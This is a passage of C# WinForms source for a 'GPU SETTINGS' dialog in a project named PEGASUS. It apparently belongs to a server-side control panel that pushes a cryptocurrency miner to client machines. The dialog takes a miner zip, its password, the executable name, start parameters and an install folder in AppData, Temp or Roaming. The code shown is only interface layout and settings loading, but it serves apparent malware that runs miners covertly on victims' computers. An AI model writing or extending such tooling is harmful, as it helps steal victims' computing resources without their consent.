using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Server.Properties;

namespace PEGASUS.Design
{
    public class GPUClientSettings : Form
    {
        public bool IsOK;

        public string filePatchbin = "";

        private IContainer components;

        private Guna2ShadowForm guna2ShadowForm1;

        private Guna2BorderlessForm guna2BorderlessForm1;

        private Guna2Panel guna2Panel1;

        private Label label1;

        private Guna2Separator guna2Separator1;

        private PictureBox pictureBox1;

        private Guna2PictureBox guna2PictureBox1;

        private Label label5;

        private Label label3;

        private Label label2;

        private Label label4;

        private Label label7;

        private Label label6;

        private Label label8;

        private Guna2GroupBox guna2GroupBox3;

        public Guna2GradientButton metroSetButton1;

        public Guna2GradientButton metroSetButton3;

        public Guna2CheckBox metroSetRadioButton2;

        public Guna2CheckBox metroSetRadioButton1;

        public Guna2TextBox metroSetTextBox1;

        public Guna2TextBox metroSetTextBox3;

        public Guna2ComboBox metroSetComboBox1;

        public Guna2TextBox metroSetTextBox4;

        public Guna2GradientButton metroSetButton2;

        public TextBox metroSetTextBox2;

        public GPUClientSettings()
        {
            InitializeComponent();
        }

        private void metroSetButton1_Click(object sender, EventArgs e)
        {
            IsOK = false;
            Hide();
        }

        private void metroSetButton3_Click(object sender, EventArgs e)
        {
            try
            {
                if (!File.Exists(metroSetButton2.Tag.ToString()))
                {
                    MessageBox.Show("Miner archive not found ");
                }
                else
                {
                    Hide();
                }
            }
            catch
            {
            }
        }

        private void metroSetButton2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "(*.zip)|*.zip";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                filePatchbin = Path.GetFullPath(openFileDialog.FileName);
                metroSetButton2.Text = filePatchbin;
                metroSetButton2.Tag = openFileDialog.FileName;
                IsOK = true;
            }
            else
            {
                IsOK = true;
            }
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void metroSetRadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            metroSetTextBox4.Text = global::Server.Properties.Settings.Default.gpu6_Proc;
            metroSetTextBox1.Text = global::Server.Properties.Settings.Default.gpu6_zipPassword;
            metroSetTextBox2.Text = global::Server.Properties.Settings.Default.gpu6_Parametrs;
            metroSetTextBox3.Text = global::Server.Properties.Settings.Default.gpu6_workDir;
            if (global::Server.Properties.Settings.Default.gpu6_sysDir == "LOCAL")
            {
                metroSetComboBox1.Text = "C:/Users/AppData/Local";
            }
            else if (global::Server.Properties.Settings.Default.gpu6_sysDir == "TEMP")
            {
                metroSetComboBox1.Text = "C:/Users/AppData/Local/Temp";
            }
            else if (global::Server.Properties.Settings.Default.gpu6_sysDir == "ROAMING")
            {
                metroSetComboBox1.Text = "C:/Users/AppData/Roaming";
            }
            if (File.Exists(global::Server.Properties.Settings.Default.gpu6_file))
            {
                metroSetButton2.Text = global::Server.Properties.Settings.Default.gpu6_file;
                metroSetButton2.Tag = global::Server.Properties.Settings.Default.gpu6_file;
                IsOK = true;
            }
            else
            {
                metroSetButton2.Text = "Browser";
            }
            metroSetButton2.Refresh();
            Refresh();
        }

        private void metroSetRadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            metroSetTextBox4.Text = global::Server.Properties.Settings.Default.gpu4_Proc;
            metroSetTextBox1.Text = global::Server.Properties.Settings.Default.gpu4_zipPassword;
            metroSetTextBox2.Text = global::Server.Properties.Settings.Default.gpu4_Parametrs;
            metroSetTextBox3.Text = global::Server.Properties.Settings.Default.gpu4_workDir;
            if (global::Server.Properties.Settings.Default.gpu4_sysDir == "LOCAL")
            {
                metroSetComboBox1.Text = "C:/Users/AppData/Local";
            }
            else if (global::Server.Properties.Settings.Default.gpu4_sysDir == "TEMP")
            {
                metroSetComboBox1.Text = "C:/Users/AppData/Local/Temp";
            }
            else if (global::Server.Properties.Settings.Default.gpu4_sysDir == "ROAMING")
            {
                metroSetComboBox1.Text = "C:/Users/AppData/Roaming";
            }
            if (File.Exists(global::Server.Properties.Settings.Default.gpu4_file))
            {
                metroSetButton2.Text = global::Server.Properties.Settings.Default.gpu4_file;
                metroSetButton2.Tag = global::Server.Properties.Settings.Default.gpu4_file;
                IsOK = true;
            }
            else
            {
                metroSetButton2.Text = "Browser";
            }
            metroSetButton2.Refresh();
            Refresh();
        }

        [DllImport("user32.DLL")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(base.Handle, 274, 61458, 0);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(GPUClientSettings));
            guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
            guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
            label1 = new System.Windows.Forms.Label();
            guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
            pictureBox1 = new System.Windows.Forms.PictureBox();
            guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            metroSetButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
            metroSetButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
            metroSetRadioButton2 = new Guna.UI2.WinForms.Guna2CheckBox();
            metroSetRadioButton1 = new Guna.UI2.WinForms.Guna2CheckBox();
            metroSetTextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
            metroSetTextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
            metroSetComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
            label4 = new System.Windows.Forms.Label();
            label2 = new System.Windows.Forms.Label();
            label3 = new System.Windows.Forms.Label();
            label5 = new System.Windows.Forms.Label();
            metroSetTextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
            label6 = new System.Windows.Forms.Label();
            label7 = new System.Windows.Forms.Label();
            metroSetButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
            label8 = new System.Windows.Forms.Label();
            guna2GroupBox3 = new Guna.UI2.WinForms.Guna2GroupBox();
            metroSetTextBox2 = new System.Windows.Forms.TextBox();
            guna2Panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
            ((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
            guna2GroupBox3.SuspendLayout();
            SuspendLayout();
            guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
            guna2ShadowForm1.TargetForm = this;
            guna2BorderlessForm1.ContainerControl = this;
            guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
            label1.AutoSize = true;
            label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            label1.ForeColor = System.Drawing.Color.LightGray;
            label1.Location = new System.Drawing.Point(341, 20);
            label1.Name = "label1";
            label1.Size = new System.Drawing.Size(132, 19);
            label1.TabIndex = 16;
            label1.Text = "GPU SETTINGS";
            guna2Panel1.Controls.Add(label1);
            guna2Panel1.Controls.Add(guna2Separator1);
            guna2Panel1.Controls.Add(pictureBox1);
            guna2Panel1.Controls.Add(guna2PictureBox1);
            guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            guna2Panel1.Location = new System.Drawing.Point(0, 0);
            guna2Panel1.Name = "guna2Panel1";
            guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
            guna2Panel1.Size = new System.Drawing.Size(800, 67);
            guna2Panel1.TabIndex = 17;
            guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
            guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            guna2Separator1.BackColor = System.Drawing.Color.Transparent;
            guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
            guna2Separator1.Location = new System.Drawing.Point(-250, 61);
            guna2Separator1.Name = "guna2Separator1";
            guna2Separator1.Size = new System.Drawing.Size(1300, 10);
            guna2Separator1.TabIndex = 13;
            guna2Separator1.UseTransparentBackground = true;
            pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            pictureBox1.Location = new System.Drawing.Point(12, 12);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new System.Drawing.Size(40, 42);
            pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            pictureBox1.TabIndex = 12;
            pictureBox1.TabStop = false;
            guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
            guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
            guna2PictureBox1.ImageRotate = 0f;
            guna2PictureBox1.Location = new System.Drawing.Point(759, 12);
            guna2PictureBox1.Name = "guna2PictureBox1";
            guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
            guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
            guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            guna2PictureBox1.TabIndex = 15;
            guna2PictureBox1.TabStop = false;
            guna2PictureBox1.UseTransparentBackground = true;
            guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
            metroSetButton1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
            metroSetButton1.BorderThickness = 1;
            metroSetButton1.CheckedState.Parent = metroSetButton1;
            metroSetButton1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetButton1.CustomImages.Parent = metroSetButton1;
            metroSetButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            metroSetButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            metroSetButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
            metroSetButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
            metroSetButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
            metroSetButton1.DisabledState.Parent = metroSetButton1;
            metroSetButton1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetButton1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetButton1.Font = new System.Drawing.Font("Electrolize", 9f);
            metroSetButton1.ForeColor = System.Drawing.Color.White;
            metroSetButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            metroSetButton1.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetButton1.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetButton1.HoverState.ForeColor = System.Drawing.Color.LightGray;
            metroSetButton1.HoverState.Parent = metroSetButton1;
            metroSetButton1.Location = new System.Drawing.Point(587, 398);
            metroSetButton1.Name = "metroSetButton1";
            metroSetButton1.ShadowDecoration.Parent = metroSetButton1;
            metroSetButton1.Size = new System.Drawing.Size(200, 32);
            metroSetButton1.TabIndex = 21;
            metroSetButton1.Text = "Cancel";
            metroSetButton1.Click += new System.EventHandler(metroSetButton1_Click);
            metroSetButton3.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
            metroSetButton3.BorderThickness = 1;
            metroSetButton3.CheckedState.Parent = metroSetButton3;
            metroSetButton3.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetButton3.CustomImages.Parent = metroSetButton3;
            metroSetButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            metroSetButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            metroSetButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
            metroSetButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
            metroSetButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
            metroSetButton3.DisabledState.Parent = metroSetButton3;
            metroSetButton3.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetButton3.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetButton3.Font = new System.Drawing.Font("Electrolize", 9f);
            metroSetButton3.ForeColor = System.Drawing.Color.White;
            metroSetButton3.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            metroSetButton3.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetButton3.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetButton3.HoverState.ForeColor = System.Drawing.Color.LightGray;
            metroSetButton3.HoverState.Parent = metroSetButton3;
            metroSetButton3.Location = new System.Drawing.Point(12, 398);
            metroSetButton3.Name = "metroSetButton3";
            metroSetButton3.ShadowDecoration.Parent = metroSetButton3;
            metroSetButton3.Size = new System.Drawing.Size(200, 32);
            metroSetButton3.TabIndex = 20;
            metroSetButton3.Text = "Ok";
            metroSetButton3.Click += new System.EventHandler(metroSetButton3_Click);
            metroSetRadioButton2.AutoSize = true;
            metroSetRadioButton2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetRadioButton2.CheckedState.BorderRadius = 0;
            metroSetRadioButton2.CheckedState.BorderThickness = 1;
            metroSetRadioButton2.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetRadioButton2.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetRadioButton2.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            metroSetRadioButton2.Location = new System.Drawing.Point(432, 405);
            metroSetRadioButton2.Name = "metroSetRadioButton2";
            metroSetRadioButton2.Size = new System.Drawing.Size(106, 18);
            metroSetRadioButton2.TabIndex = 139;
            metroSetRadioButton2.Text = "GPU Miner 4GB";
            metroSetRadioButton2.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetRadioButton2.UncheckedState.BorderRadius = 0;
            metroSetRadioButton2.UncheckedState.BorderThickness = 1;
            metroSetRadioButton2.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetRadioButton2.CheckedChanged += new System.EventHandler(metroSetRadioButton2_CheckedChanged);
            metroSetRadioButton1.AutoSize = true;
            metroSetRadioButton1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetRadioButton1.CheckedState.BorderRadius = 0;
            metroSetRadioButton1.CheckedState.BorderThickness = 1;
            metroSetRadioButton1.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetRadioButton1.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetRadioButton1.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            metroSetRadioButton1.Location = new System.Drawing.Point(261, 405);
            metroSetRadioButton1.Name = "metroSetRadioButton1";
            metroSetRadioButton1.Size = new System.Drawing.Size(122, 18);
            metroSetRadioButton1.TabIndex = 138;
            metroSetRadioButton1.Text = "GPU Miner 6 GB + ";
            metroSetRadioButton1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetRadioButton1.UncheckedState.BorderRadius = 0;
            metroSetRadioButton1.UncheckedState.BorderThickness = 1;
            metroSetRadioButton1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetRadioButton1.CheckedChanged += new System.EventHandler(metroSetRadioButton1_CheckedChanged);
            metroSetTextBox3.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
            metroSetTextBox3.DefaultText = "";
            metroSetTextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetTextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetTextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox3.DisabledState.Parent = metroSetTextBox3;
            metroSetTextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox3.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetTextBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetTextBox3.FocusedState.Parent = metroSetTextBox3;
            metroSetTextBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            metroSetTextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetTextBox3.HoverState.Parent = metroSetTextBox3;
            metroSetTextBox3.Location = new System.Drawing.Point(297, 173);
            metroSetTextBox3.Name = "metroSetTextBox3";
            metroSetTextBox3.PasswordChar = '\0';
            metroSetTextBox3.PlaceholderText = "";
            metroSetTextBox3.SelectedText = "";
            metroSetTextBox3.ShadowDecoration.Parent = metroSetTextBox3;
            metroSetTextBox3.Size = new System.Drawing.Size(216, 21);
            metroSetTextBox3.TabIndex = 150;
            metroSetTextBox1.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
            metroSetTextBox1.DefaultText = "password";
            metroSetTextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetTextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetTextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox1.DisabledState.Parent = metroSetTextBox1;
            metroSetTextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetTextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetTextBox1.FocusedState.Parent = metroSetTextBox1;
            metroSetTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            metroSetTextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetTextBox1.HoverState.Parent = metroSetTextBox1;
            metroSetTextBox1.Location = new System.Drawing.Point(136, 138);
            metroSetTextBox1.Name = "metroSetTextBox1";
            metroSetTextBox1.PasswordChar = '\0';
            metroSetTextBox1.PlaceholderText = "password";
            metroSetTextBox1.SelectedText = "";
            metroSetTextBox1.SelectionStart = 8;
            metroSetTextBox1.ShadowDecoration.Parent = metroSetTextBox1;
            metroSetTextBox1.Size = new System.Drawing.Size(599, 21);
            metroSetTextBox1.TabIndex = 151;
            metroSetComboBox1.BackColor = System.Drawing.Color.Transparent;
            metroSetComboBox1.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            metroSetComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            metroSetComboBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetComboBox1.FocusedColor = System.Drawing.Color.FromArgb(180, 36, 36);
            metroSetComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(180, 36, 36);
            metroSetComboBox1.FocusedState.Parent = metroSetComboBox1;
            metroSetComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.749999f);
            metroSetComboBox1.ForeColor = System.Drawing.Color.LightGray;
            metroSetComboBox1.HoverState.Parent = metroSetComboBox1;
            metroSetComboBox1.ItemHeight = 30;
            metroSetComboBox1.Items.AddRange(new object[3] { "C:/Users/AppData/Local", "C:/Users/AppData/Local/Temp", "C:/Users/AppData/Roaming" });
            metroSetComboBox1.ItemsAppearance.Parent = metroSetComboBox1;
            metroSetComboBox1.Location = new System.Drawing.Point(136, 106);
            metroSetComboBox1.Name = "metroSetComboBox1";
            metroSetComboBox1.ShadowDecoration.Parent = metroSetComboBox1;
            metroSetComboBox1.Size = new System.Drawing.Size(140, 36);
            metroSetComboBox1.TabIndex = 153;
            label4.AutoSize = true;
            label4.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            label4.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label4.Location = new System.Drawing.Point(30, 206);
            label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label4.Name = "label4";
            label4.Size = new System.Drawing.Size(97, 14);
            label4.TabIndex = 154;
            label4.Text = "Start parameters:";
            label2.AutoSize = true;
            label2.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            label2.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label2.Location = new System.Drawing.Point(30, 177);
            label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label2.Name = "label2";
            label2.Size = new System.Drawing.Size(72, 14);
            label2.TabIndex = 155;
            label2.Text = "Install Patch:";
            label3.AutoSize = true;
            label3.BackColor = System.Drawing.Color.Transparent;
            label3.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label3.Location = new System.Drawing.Point(366, 388);
            label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label3.Name = "label3";
            label3.Size = new System.Drawing.Size(76, 14);
            label3.TabIndex = 156;
            label3.Text = "Load settings:";
            label5.AutoSize = true;
            label5.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            label5.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label5.Location = new System.Drawing.Point(30, 146);
            label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label5.Name = "label5";
            label5.Size = new System.Drawing.Size(99, 14);
            label5.TabIndex = 157;
            label5.Text = "Archive password:";
            metroSetTextBox4.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
            metroSetTextBox4.DefaultText = "Miner name in archive ";
            metroSetTextBox4.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetTextBox4.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetTextBox4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox4.DisabledState.Parent = metroSetTextBox4;
            metroSetTextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetTextBox4.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetTextBox4.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetTextBox4.FocusedState.Parent = metroSetTextBox4;
            metroSetTextBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            metroSetTextBox4.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
            metroSetTextBox4.HoverState.Parent = metroSetTextBox4;
            metroSetTextBox4.Location = new System.Drawing.Point(536, 173);
            metroSetTextBox4.Name = "metroSetTextBox4";
            metroSetTextBox4.PasswordChar = '\0';
            metroSetTextBox4.PlaceholderText = "Miner name in archive ";
            metroSetTextBox4.SelectedText = "";
            metroSetTextBox4.SelectionStart = 22;
            metroSetTextBox4.ShadowDecoration.Parent = metroSetTextBox4;
            metroSetTextBox4.Size = new System.Drawing.Size(199, 21);
            metroSetTextBox4.TabIndex = 158;
            label6.AutoSize = true;
            label6.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            label6.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label6.Location = new System.Drawing.Point(283, 178);
            label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label6.Name = "label6";
            label6.Size = new System.Drawing.Size(13, 14);
            label6.TabIndex = 159;
            label6.Text = "/";
            label7.AutoSize = true;
            label7.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            label7.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label7.Location = new System.Drawing.Point(518, 177);
            label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label7.Name = "label7";
            label7.Size = new System.Drawing.Size(13, 14);
            label7.TabIndex = 160;
            label7.Text = "/";
            metroSetButton2.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
            metroSetButton2.BorderThickness = 1;
            metroSetButton2.CheckedState.Parent = metroSetButton2;
            metroSetButton2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetButton2.CustomImages.Parent = metroSetButton2;
            metroSetButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            metroSetButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            metroSetButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
            metroSetButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
            metroSetButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
            metroSetButton2.DisabledState.Parent = metroSetButton2;
            metroSetButton2.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetButton2.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
            metroSetButton2.Font = new System.Drawing.Font("Electrolize", 9f);
            metroSetButton2.ForeColor = System.Drawing.Color.White;
            metroSetButton2.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            metroSetButton2.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
            metroSetButton2.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            metroSetButton2.HoverState.ForeColor = System.Drawing.Color.LightGray;
            metroSetButton2.HoverState.Parent = metroSetButton2;
            metroSetButton2.Location = new System.Drawing.Point(136, 52);
            metroSetButton2.Name = "metroSetButton2";
            metroSetButton2.ShadowDecoration.Parent = metroSetButton2;
            metroSetButton2.Size = new System.Drawing.Size(599, 21);
            metroSetButton2.TabIndex = 161;
            metroSetButton2.Text = "Browse";
            metroSetButton2.Click += new System.EventHandler(metroSetButton2_Click);
            label8.AutoSize = true;
            label8.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            label8.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label8.Location = new System.Drawing.Point(740, 177);
            label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label8.Name = "label8";
            label8.Size = new System.Drawing.Size(26, 14);
            label8.TabIndex = 162;
            label8.Text = ".exe";
            guna2GroupBox3.BorderColor = System.Drawing.Color.FromArgb(26, 26, 26);
            guna2GroupBox3.Controls.Add(metroSetTextBox2);
            guna2GroupBox3.Controls.Add(metroSetComboBox1);
            guna2GroupBox3.Controls.Add(metroSetButton2);
            guna2GroupBox3.CustomBorderColor = System.Drawing.Color.FromArgb(27, 27, 27);
            guna2GroupBox3.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
            guna2GroupBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            guna2GroupBox3.ForeColor = System.Drawing.Color.LightGray;
            guna2GroupBox3.Location = new System.Drawing.Point(0, 59);
            guna2GroupBox3.Name = "guna2GroupBox3";
            guna2GroupBox3.ShadowDecoration.Parent = guna2GroupBox3;
            guna2GroupBox3.Size = new System.Drawing.Size(800, 318);
            guna2GroupBox3.TabIndex = 163;
            guna2GroupBox3.Text = "GPU Settings";
            metroSetTextBox2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
            metroSetTextBox2.BorderStyle = System.Windows.Forms.BorderStyle.None;
            metroSetTextBox2.ForeColor = System.Drawing.Color.LightGray;
            metroSetTextBox2.Location = new System.Drawing.Point(136, 148);
            metroSetTextBox2.Multiline = true;
            metroSetTextBox2.Name = "metroSetTextBox2";
            metroSetTextBox2.Size = new System.Drawing.Size(599, 158);
            metroSetTextBox2.TabIndex = 162;
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
            base.ClientSize = new System.Drawing.Size(800, 450);
            base.Controls.Add(label8);
            base.Controls.Add(label7);
            base.Controls.Add(label6);
            base.Controls.Add(metroSetTextBox4);
            base.Controls.Add(label5);
            base.Controls.Add(label3);
            base.Controls.Add(label2);
            base.Controls.Add(label4);
            base.Controls.Add(metroSetTextBox1);
            base.Controls.Add(metroSetTextBox3);
            base.Controls.Add(metroSetRadioButton2);
